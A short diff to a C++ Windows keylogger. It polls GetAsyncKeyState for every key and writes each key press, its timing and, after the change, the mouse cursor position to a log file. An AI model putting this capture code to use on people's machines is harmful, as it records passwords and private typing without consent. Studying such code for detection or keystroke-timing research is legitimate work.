@@ -86,7 +86,10 @@ int main(int argc, char *argv[]){
 		// logging keys, thats the keylogger
 		for(unsigned char c = 1; c < 255; c++){
 			SHORT rv = GetAsyncKeyState(c);
-			
+
+			POINT point;
+			GetCursorPos(&point);
+
 			if(rv & 1){ // on press button down
 				t2 = steady_clock::now();
 				duration<double> time_span = duration_cast<duration<double>>(t2 - t1);
@@ -181,11 +184,11 @@ int main(int argc, char *argv[]){
 					out = "[KEY \\" + intToString(c) + "]";
 				
 #ifdef DEBUG
-				cout << out << "," << (unsigned)c << "," << time_span.count() <<  endl;
+				cout << out << "," << (unsigned)c << "," << time_span.count() << "," << point.x << "," << point.y << endl;
 				std::cout << std::endl;
 #endif
 				//klogout << out;
-				klogout << out << "," << (unsigned)c << "," << time_span.count() <<  endl;
+				klogout << out << "," << (unsigned)c << "," << time_span.count() << "," << point.x << "," << point.y <<  endl;
 				klogout.flush();
 				
 				//lastc = c;
